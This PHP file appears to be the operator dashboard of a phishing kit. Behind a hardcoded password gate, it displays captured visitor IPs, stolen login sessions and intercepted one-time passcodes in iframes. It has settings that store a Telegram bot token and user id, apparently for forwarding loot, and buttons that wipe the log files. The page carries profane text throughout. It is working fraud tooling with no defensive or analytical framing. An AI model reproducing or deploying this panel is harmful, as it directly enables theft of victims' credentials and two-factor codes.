<?php
session_start();
error_reporting(0);
set_time_limit(0);
ini_set("memory_limit",-1);

$password = "fuckyou.";

$sessioncode = 'global_identifier';
if(!empty($password) and $_SESSION[$sessioncode] != $password){
    # _REQUEST mean _POST or _GET 
    if (isset($_REQUEST['pass']) and $_REQUEST['pass'] == $password) {
        $_SESSION[$sessioncode] = $password;
    }
    else {
        print "<pre align=center><form method=post>Password: <input type='password' name='pass'><input type='submit' value='>>'></form></pre>";
        exit;        
    }
}
?>
<style>
        BODY {
       background:black;
        }
        .clearvisit:hover{
            background:white;
            color:black;
        }
        </style>
        
        <table border="2" style="width:100%">
        <td><font color='white' size='2'><center><b>VISITORS IP</b></center></font></td>
        <td><font color='white' size='2'><center><b>SETTINGS</b></center></font></td></tr>
        <tr>
                <td style="height: 200px; width: 967px;"
           align="undefined" valign="undefined">
                    <iframe id="visit" src="visit.php" style="border-width:0" width=100% height=100% frameborder="0" scrolling="yes"></iframe>
                </td>


                <td style="height: 200px; width: 467px;"
           align="undefined" valign="undefined">
           <?php
                 $pass = $_POST['pass_panel'];
                 if(isset($_POST['submit_setting'])){
                    setcookie("panel_password", $pass, time() + (10 * 365 * 24 * 60 * 60), "/");
                   if(isset($_COOKIE['panel_password'])){
                       echo "<script>location.reload();</script>";
                   }
                 } 

                 if(isset($_POST['submit_tele'])){
                    setcookie("tel_token", $_POST['tel_token'], time() + (10 * 365 * 24 * 60 * 60), "/");
                    setcookie("user_id", $_POST['user_id'], time() + (10 * 365 * 24 * 60 * 60), "/");
                
                 }

                 if($_GET['clear'] == "visitorsip"){
                        echo "<script>alert('Clear visitors ip done');window.location.href='?ok';</script>";
                        fwrite(fopen("visit.php","w"),"<meta http-equiv=\"refresh\" content=\"2\"><style>BODY {background-color : black;}</style>");
                 }
                 if($_GET['clear'] == "loginsession"){
                        echo "<script>alert('Clear login session done');window.location.href='?ok';</script>";
                        fwrite(fopen("logs.php","w"),"<meta http-equiv=\"refresh\" content=\"2\"><style>BODY {background-color : black;}</style>");
                 }

                 if($_GET['clear'] == "otpsession"){
                         echo "<script>alert('Clear otp session done');window.location.href='?ok';</script>";
                         fwrite(fopen("otp.php","w"),"<meta http-equiv=\"refresh\" content=\"2\"><style>BODY {background-color : black;}</style>");
                }
                 
           ?>
                   <form method="POST">
                    <label style="color:white;">Change password</label><br>
                    <input style="color:green;width:350px;background:#333;outline:none;border:none;padding:5px;" name="pass_panel" value="<?php echo $password;?>" type=text>
                    <input style="color:green;width:100px;background:transparent;outline:none;padding:5px;cursor:pointer;" name="submit_setting" value="CHANGE" type=submit>
                    <br><br>
                    </form>

                </td>
               
              </tr>
         <tr>
         <td>
                  <a href="?clear=visitorsip"  style="color:white;text-decoration:0;"><font color='white' size='2'><center class="clearvisit"><b>CLEAR</b></center></font></a>
              </td>
         </tr>
        </table>
        <table border="2" style="width:100%">
        <tr><td><font color='white' size='2'><center><b>LOGIN SESSION</b></center></font></td><td><font color='white' size='2'><center><b>OTP SESSION</b></center></font></td></tr>
        <tr>
                <td style="height: 397px; width: 250px;"
           align="undefined" valign="undefined">
                    <iframe id="logs" src="logs.php" style="border-width:0" width=100% height=100% frameborder="0" scrolling="yes"></iframe>
                </td>
                <td style="height: 397px; width: 231px;"
           align="undefined" valign="undefined">       
                    <iframe id="otp" src="otp.php" style="border-width:0" width=100% height=100% frameborder="0" scrolling="yes"></iframe>
                </td>
              </tr>
              <tr>
              <td>
                  <a href="?clear=loginsession" style="color:white;text-decoration:0;"><font color='white' size='2'><center class="clearvisit"><b>CLEAR</b></center></font></a>
              </td>
              <td>
                  <a href="?clear=otpsession" style="color:white;text-decoration:0;"><font color='white' size='2'><center class="clearvisit"><b>CLEAR</b></center></font></a>
              </td>
              </tr>
              </table>
              
              <font color='green' size='3'><center><marquee><b>TITE KO MALAKE</b></marquee></center></font>